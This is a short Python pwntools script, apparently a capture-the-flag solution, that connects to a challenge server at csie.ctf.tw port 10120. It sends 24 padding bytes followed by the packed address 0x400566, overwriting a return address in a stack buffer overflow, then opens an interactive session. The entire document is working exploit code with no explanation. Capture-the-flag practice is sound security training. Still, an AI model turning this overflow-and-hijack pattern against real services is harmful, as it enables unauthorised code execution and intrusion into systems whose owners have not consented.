#!/usr/bin/python
from pwn import *

host = 'csie.ctf.tw'
port = 10120

r = remote(host, port)


r.sendline('a'*24 + p64(0x400566))
r.interactive()

